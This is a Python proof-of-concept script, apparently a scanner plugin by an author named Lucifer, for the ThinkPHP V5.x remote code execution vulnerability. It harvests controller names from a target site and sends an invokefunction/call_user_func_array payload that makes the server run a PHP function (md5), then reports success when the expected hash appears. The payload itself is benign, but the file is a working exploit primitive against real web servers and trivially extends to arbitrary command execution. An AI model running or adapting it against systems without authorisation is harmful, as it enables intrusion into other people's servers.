#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP V5.x远程代码执行漏洞_1
referer: https://iaq.pw/archives/106
author: Lucifer
description: ThinkPHP V5.x代码执行漏洞
'''
import re
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class thinkphp_v5x_code_exec_1:
    def __init__(self, url):
        self.url = url

    def extract_controller(self, url):
        urls = list()
        req = requests.get(self.url, timeout=10, verify=False)
        pattern = '<a[\\s+]href="/[A-Za-z]+'
        matches = re.findall(pattern, req.text)
        for match in matches:
            urls.append(match.split('/')[1])
        urls = list(set(urls))
        urls.append('index')
        return urls

    def run(self):
        controllers = self.extract_controller(self.url)
        for controller in controllers:
            payload = "/?s={}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=123".format(controller)
            vulnurl = self.url + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                if r"202cb962ac59075b964b07152d234b70" in req.text:
                    printGreen("[+]Success:存在ThinkPHP 代码执行漏洞...(高危)\tpayload: "+vulnurl)
                    break
                else:
                    printBlue("[-]Info:不存在thinkphp_code_exec漏洞")

            except:
                printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = thinkphp_v5x_code_exec_1(sys.argv[1])
    testVuln.run()